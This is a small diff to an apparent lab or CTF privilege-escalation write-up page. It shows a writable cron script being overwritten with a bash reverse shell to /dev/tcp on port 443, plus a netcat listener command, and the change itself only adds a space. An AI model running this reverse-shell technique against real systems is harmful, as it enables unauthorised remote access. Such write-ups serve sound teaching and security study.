@@ -278,7 +278,7 @@ The file `/usr/local/bin/overwrite.sh` is also writable.
 
 The file `/usr/local/bin/overwrite.sh` can be overwritten with `reverse shell payload` to gain access.
 {% capture code %}{% raw %}#!/bin/bash
-bash -i >& /dev/tcp/<source-ip>/443 0>&1{% endraw %}{% endcapture %} {% include code.html code=code %}
+bash -i >& /dev/tcp/<source-ip>/443 0>&1 {% endraw %}{% endcapture %} {% include code.html code=code %}
 
 Create a `netcat` listener. During the next cron schedule, `reverse shell` will be spawned.
 {% capture code %}{% raw %}rlwrap -cAr nc -lnvp 443{% endraw %}{% endcapture %} {% include code.html code=code %}
